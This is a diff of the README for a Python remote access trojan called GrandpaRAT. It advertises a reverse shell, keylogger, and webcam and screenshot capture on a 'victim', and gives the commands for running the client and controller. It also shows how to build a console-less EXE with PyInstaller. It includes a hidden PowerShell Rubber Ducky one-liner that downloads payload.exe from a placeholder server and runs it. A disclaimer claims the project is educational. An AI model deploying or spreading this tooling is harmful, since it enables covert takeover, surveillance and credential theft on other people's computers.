@@ -12,23 +12,23 @@ Edit
 
 ## 🧠 Features
 
-| Feature                        | Description                                     |
-|-------------------------------|-------------------------------------------------|
-| 🔁 Reverse Shell              | Execute remote shell commands on the victim    |
-| 🔐 Password Protection        | Secure client-server communication             |
-| 📷 Screenshot Capture         | Take and retrieve desktop screenshots          |
-| 🎥 Webcam Snapshot            | Capture image from victim’s webcam             |
-| ⌨️ Keylogger                 | Log keystrokes silently in the background      |
-| 🧠 GUI Controller             | Intuitive Tkinter-based interface              |
-| 🖥️ Terminal Controller       | Optional command-line controller               |
-| 💉 Rubber Ducky Payload       | USB attack script for automatic delivery       |
-| 🔧 Obfuscation (WIP)          | Placeholder for EXE stealth & encryption       |
+| Feature                | Description                                     |
+|------------------------|-------------------------------------------------|
+| 🔁 Reverse Shell      | Execute remote shell commands on the victim    |
+| 🔐 Password Protection| Secure client-server communication             |
+| 📷 Screenshot Capture | Take and retrieve desktop screenshots          |
+| 🎥 Webcam Snapshot    | Capture image from victim’s webcam             |
+| ⌨️ Keylogger         | Log keystrokes silently in the background      |
+| 🧠 GUI Controller     | Intuitive Tkinter-based interface              |
+| 🖥️ Terminal Controller| Optional command-line controller               |
+| 💉 Rubber Ducky Script| USB attack payload to auto-deploy client       |
+| 🔧 Obfuscation Ready  | Placeholder for `.exe` stealth tools (WIP)     |
 
 ---
 
 ## 📂 Project Structure
 
-GrandpaRAT-v2.0/ ├── client/ # RAT client scripts (keylogger, webcam, shell) ├── server/ # GUI & CLI controllers ├── delivery/ # USB-based rubber ducky payload ├── build_tools/ # Obfuscation & EXE builder (to be added) ├── README.md # This documentation └── .gitignore # Git exclusions
+GrandpaRAT-v2.0/ ├── client/ # RAT client scripts (keylogger, webcam, shell) ├── server/ # GUI & CLI controllers ├── delivery/ # USB-based rubber ducky payload ├── build_tools/ # Obfuscation & EXE builder ├── Screenshot (11).png # GUI controller screenshot ├── Screenshot (12).png # Live connection preview ├── README.md # This documentation └── .gitignore # Git exclusions
 
 yaml
 Copy
@@ -38,32 +38,36 @@ Edit
 
 ## 🚀 Getting Started
 
-### 📦 Dependencies
+### 📦 Install Dependencies
 
 ```bash
 pip install pyautogui opencv-python pynput
-🧪 Usage (Test Lab Setup)
-Start the GUI server (controller):
-
+🧪 Usage
+1. Start the GUI controller (server)
 bash
 Copy
 Edit
 cd server
 python gui_controller.py
-Run the RAT client (on victim or test machine):
-
+2. Run the RAT client (on victim or VM)
 bash
 Copy
 Edit
 cd client
 python rat_client.py
-Once connected:
+3. From GUI, send commands like:
+whoami, ipconfig
 
-Type commands like whoami, screenshot, webcam, or exit
+screenshot, webcam
 
-Outputs will appear in the GUI
+exit
 
-🛠️ Build Client to .EXE
+🖼️ Screenshots
+GUI Controller
+
+Live Connection View
+
+🛠️ Building Client to .exe
 Install PyInstaller:
 
 bash
@@ -76,27 +80,27 @@ bash
 Copy
 Edit
 pyinstaller --onefile --noconsole rat_client.py
-EXE will be in the /dist folder
+The .exe will be created inside /dist/
 
-🕵️ Obfuscation and AV evasion steps will be available in /build_tools/obfuscate.py (coming soon)
+✅ Tip: Run it in a test VM and use your controller to manage the session.
 
-🧪 Rubber Ducky Delivery (USB)
-Found in delivery/rubber_ducky_payload.txt. Load onto a Rubber Ducky or HID attack tool to automate:
+🧪 USB Rubber Ducky Payload
+Found in delivery/rubber_ducky_payload.txt — this is a payload you can flash onto a Rubber Ducky or HID emulator:
 
 powershell
 Copy
 Edit
 powershell -w hidden -c "iwr http://yourserver/payload.exe -OutFile $env:temp\\rat.exe; Start-Process $env:temp\\rat.exe"
-👨‍🔬 Legal Disclaimer
-This software is intended strictly for educational purposes and authorized penetration testing.
-Do not deploy on unauthorized networks or systems.
-The author assumes no responsibility for misuse or damage.
+🔒 Legal Disclaimer
+This software is provided for educational purposes only.
+Unauthorized access to computer systems is illegal.
+Use only on systems you own or are authorized to test.
+The author assumes no responsibility for misuse.
 
-🧑‍💻 Author
+👨‍💻 Author
 Matthew Ogoh – Cybersecurity Specialist & Ethical Hacker
 GitHub: @grandpacltn
-Twitter: @cybergrandpa__
+Twitter: @cybergrandpa
 
-⭐ Show Some Love
-If this project helped you learn, consider giving it a ⭐ on GitHub. Let's build safer systems and smarter hackers!
-
+⭐ Star The Project
+If this helped you learn ethical hacking or inspired your own build, give it a ⭐ and share it with fellow learners!
